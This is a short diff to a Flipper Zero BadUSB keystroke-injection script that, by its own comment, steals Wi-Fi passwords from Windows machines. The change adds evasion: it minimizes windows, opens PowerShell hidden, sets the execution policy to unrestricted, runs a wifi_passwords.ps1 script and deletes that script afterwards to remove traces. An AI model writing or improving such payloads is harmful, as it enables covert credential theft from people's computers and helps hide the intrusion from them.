@@ -1,9 +1,13 @@
 REM This is an example of stealing wifi password using flipper zero
 
+REM Minimize all app
+GUI d
+DELAY 750
+
 REM Open windows powershell
 GUI r
-DELAY 500
-STRING powershell.exe
+DELAY 750
+STRING powershell.exe -windowstyle hidden
 ENTER
 DELAY 750
 
@@ -19,8 +23,12 @@ ENTER
 REM Set execution policy
 STRING Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy unrestricted
 ENTER
-DELAY 500
+DELAY 750
 STRING a
 ENTER
 STRING .\wifi_passwords.ps1
+ENTER
+
+REM Delete ps1 file
+STRING Remove-Item .\wifi_passwords.ps1
 ENTER
